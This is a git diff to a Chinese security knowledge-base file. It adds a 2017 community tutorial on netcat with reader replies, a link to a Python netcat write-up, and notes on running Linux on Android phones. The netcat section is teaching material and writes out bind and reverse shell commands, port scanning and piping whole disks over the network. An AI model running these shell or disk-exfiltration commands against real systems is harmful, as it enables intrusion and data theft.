@@ -6,7 +6,9 @@
 - [DVWA](#dvwa)
 - [BeEF](#beef)
 - [nmap](#nmap)
+- [nc](#nc)
 - [Kali](#kali)
+- [nethunter](#nethunter)
 - [OSINT](#osint)
 - [Secure Headers](#secure-headers)
 - [隐写](#隐写)
@@ -423,6 +425,112 @@ Nmap 是玩安全的人必备的工具，无论攻防都必备，基于 Nmap 写
 
 ---
 
+## nc
+
+
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-02:
+
+
+__#工具#__
+
+基础工具篇之NC
+NC 是一个大家都知道的经典工具，可以说它已经比较老旧了，但是我还是认为从事安全工作必须能熟练应用它，因为它不仅功能强大，最最重要是类Linux系统都内置已经存在了。估计大多数人对它功能知晓不全。
+
+1. 监听端口
+     `nc -l -p 5000`  (-l设置监听模式；-p设置监听端口)，这个大家用的最多可能是拿来接收反弹shell，就不多说了。
+2. 连接端口
+     `nc -nv 192.168.1.1 80` (-n 设置不解析域名，直接通过ip来连接； -v 显示详细的输出内容)，IP后面跟的是要连     接的端口，用的最多的应该还是直接连接一个开了监听端口的后门，其实它可以连接一些端口获取banner并执行一     些指令模拟发包。
+     一端执行监听，一边用nc连接，那么双方可以发送一些文本信息，来模拟一个聊天工具，当然这在实际中没什么     用，不过变通一下就能起到作用了。
+     A:`nc -lp 5000`   B: `ps | nc -nv 192.168.1.1 5000`
+     A监听端口，B执行命令并将命令回显通过nc传输到A端的屏幕上显示，这常常应用在一些电子取证的场景上，我     们不希望在取证目标磁盘上写入任何东西。就可以通过这种方式来采集目标上的一些信息。
+     当然你A端可以直接 `nc -l -p 5000 > ps.txt`,将接收到的信息直接写入文件。
+3. 传输文件
+     A: `nc -lp 5000 > 123.log`    B: `nc -nv 192.168.1.1 5000 < /var/message.log -q 1`  (这里-q代表传输完成后1 秒就断开连接)
+     也可以变换成这样反向来传输   A: `nc -nv 192.168.1.1 5000 > 123.log`    B: `nc -lp 5000 < /var/message.log     -q 1`（谁连接这个端口，就自动把message.log发送过去）
+4. 传输目录
+     A: `tar -cvf - /tmp | nc -lp 5000 -q 1` (先将/tmp 目录进行打包注意cvf 后面有一个（-）符合，并通过管道符     将数据重定向到nc监听上)
+     B: `nc -nv 192.168.1.1 5000 | tar -xvf -`   (接收到的数据重定向给tar解包)
+5. 端口扫描
+     `nc -nvz 192.168.1.1 1-65535` (-z代表扫描模式，不会进行I/O 信息交换，仅仅探测端口开放)
+     `nc -nvzu 192.168.1.1 1-65535` (-u 代表通过upd方式扫描)
+     nc肯定不能代替扫描器，精确度也不怎么好，不建议使用。
+6. 硬盘克隆
+     A: `nc -lp 5000 | dd of=/dev/sda` (nc监听5000端口，将接收到的数据，通过dd of，将数据完整写到/dev     /sda 磁盘上)
+     B: `dd if=/dev/sda | nc -nv 192.168.1.1 5000 -q 1` (通过dd if 将/dev/sda 硬盘进行克隆，这个是从硬盘底     层数据的扇区、块上进行复制，克隆出来将会是状态完全一样的硬盘，通过管道重定向给nc命令并传送到远程ip上)
+     这个功能常常会用在电子取证上，克隆出一个一样的硬盘，进行数据分析。当然不仅复制硬盘，也可以复制受害机     器的内存。(/proc 文件夹下是内存中的数据)
+7. 发送shell
+     A: `nc -lp 5000 -c bash`  (-c 调用bash做为交互,如果是windows下改为-e cmd)
+     B： `nc -nv 192.168.1.1 5000`
+     当然也可以反向发送shell
+     A: `nc -nv 192.168.1.1 5000 -c bash`
+     B: `nc -lp 5000`
+    
+弦哥，刚刚转的TK传授的学习方法，学习一个工具，要去看它每个参数，并弄懂其作用，现附上参数中文翻译
+
+语法 nc/netcat(选项)(参数)
+选项 
+
+```
+-g<网关>：设置路由器跃程通信网关，最多设置8个；
+-d 无命令行界面，使用后台模式
+-c 程序重定向，比如-c bash，nc传输过来的数据就会指向bash去执行
+-e 这个也是程序重定向，用在windows下
+-G<指向器数目>：设置来源路由指向器，其数值为4的倍数；
+-h：在线帮助； -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口；
+-l：使用监听模式，监控传入的资料；
+-L：也是用作监听，不过监听端不终止nc的话，连接端终止后，监听端依然保持监听状态。
+-n：直接使用ip地址，而不通过域名服务器；
+-o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；
+-p<通信端口>：设置本地主机使用的通信端口；
+-r：指定源端口和目的端口都进行随机的选择；
+-s<来源位址>：设置本地主机送出数据包的IP地址；
+-u：使用UDP传输协议；
+-v：显示指令执行过程；
+-w<超时秒数>：设置等待连线的时间，一般扫描时加上；
+-z：使用0输入/输出模式，只在扫描通信端口时使用。
+```
+
+欢迎大家提交更多的使用方法！
+
+
+
+...
+
+<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 请问我使用参数-q 1文件传完没有自动断开，我使用-w 1可以自动断开，这两个参数有什么区别？
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 你是在传输那边加的-q 1吗？-w 是设置超时时间，一般用在扫描端口上，探测某个端口没反应的等待时间
+
+<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 感谢大大解答。找到原因了，是弄反了，另外比较了一下，linux版带-q，windows版的nc没-q，而且少好几个参数。
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-07-03:
+
+
+__#姿势#__
+
+ 
+__#python#__
+
+ 
+
+刚好之前ke分享了netcat的使用，这次为大家分享一下如何使用python编写一个简单的python版的netcat。
+
+
+[python编写简单netcat | D_infinite的小站](http://dinfinite.cn/2017/07/03/python%E7%BC%96%E5%86%99%E7%AE%80%E5%8D%95netcat/)
+
+
+
+还是一样，有任何问题和建议欢迎评论区留言，咱们共同分享，共同进步。
+
+
+
+---
+
+
 ## Kali
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-18:
@@ -446,6 +554,44 @@ BTW：很多开源工具都是 Python 写的，我们在用爽的同时不妨学
 <img src="https://images.xiaomiquan.com/FtLBOd503NNTsOrwDZWvfpyYT-Tf?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7VBoWHu9g1ANgaguRGMOKa5Kyq4=" width="50%" height="50%" align="middle"/>
 
 ---
+
+## nethunter
+
+
+
+<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-06-28:
+
+玩黑手的大伙儿估计都知道nethunter，很不错的黑手套装，只是有些机型比较难刷。今天推一个不一样的黑手玩法：How about a complete Linux on your phone?
+
+Linuxdeploy(play商店有下)能够在root过的安卓手机上安装完整Linux系统，目前支持的发行版有Debian, Ubuntu, Kali Linux, Arch Linux, Fedora, CentOS, Gentoo, openSUSE, Slackware, RootFS 
+功能非常之强大，还支持好几种GUI，更多功能有待大家慢慢把玩
+
+Play商店下载地址
+[https://play.google.com/store/apps/details?id=ru.m...](https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy)
+
+
+
+另外，linuxdeploy还是开源的！
+
+[GitHub - meefik/linuxdeploy: Install and run GNU/L...](https://github.com/meefik/linuxdeploy)
+
+
+
+有的同学可能会觉得手机上键盘是个痛点，没关系我们有hacker keyboard
+
+[https://play.google.com/store/apps/details?id=org....](https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard)
+
+
+
+
+What you can do on Linux, you can do the same on your PHONE
+
+<img src="https://images.xiaomiquan.com/FmquZZWgZvzfY2fLJ_thKf6q6ViE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ef1vBeGiGMuP6yZL7GL_xOsWYK4=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/FiIojwNo0_ehijjifjOMjddpRrLi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gFWPK2hQHtn_DnSZemaTZ6_hvtM=" width="50%" height="50%" align="middle"/>
+
+
+---
+
 
 ## OSINT
 
